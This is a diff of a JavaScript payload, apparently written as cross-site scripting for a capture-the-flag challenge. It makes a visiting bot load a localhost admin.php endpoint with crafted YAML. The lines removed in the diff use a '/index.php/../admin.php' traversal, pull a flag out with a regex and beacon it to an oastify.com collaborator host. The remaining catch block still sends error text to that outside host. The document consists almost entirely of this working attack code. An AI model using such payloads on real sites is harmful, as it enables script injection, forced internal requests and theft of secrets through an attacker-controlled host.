@@ -1,31 +1,19 @@
 <script>
-      (async () => {
+(async () => {
     try {
       const yaml =
         "- {amount: 1000001, currency: ZZ, op: BUY}\n" +
         "- {amount: 1000001, currency: ZZ, op: SELL}\n" +
         "- {amount: 1, currency: FL, op: BUY}\n";
 
-      // index.phpを使ってYAMLデータを直接返すエンドポイントを作成
-      const yamlEndpoint = "http://localhost:5000/index.php?html=" + encodeURIComponent(yaml);
+      // YAMLを返すindex.phpのURL（bot内でアクセス）
+      const yamlUrl = "http://localhost:5000/index.php?html=" + encodeURIComponent(yaml);
 
-      // admin.phpにそのエンドポイントを指定
-      const response = await fetch("/index.php/../admin.php", {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: 'url=' + encodeURIComponent(yamlEndpoint)
-      });
+      // admin.phpにリダイレクト（bot内で処理）
+      window.location.href = "http://localhost:5000/admin.php?url=" + encodeURIComponent(yamlUrl);
 
-      const result = await response.text();
-      const flagMatch = result.match(/Final\s+Inventory\s+FL\s*:\s*([A-Za-z0-9_\-:{}\[\].=]+)/);
-
-      if (flagMatch) {
-        new Image().src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?flag=" + encodeURIComponent(flagMatch[1]);
-      } else {
-        new Image().src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?debug=" + encodeURIComponent(result);
-      }
     } catch (e) {
       new Image().src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?error=" + encodeURIComponent(String(e));
     }
-  })();
+})();
 </script>
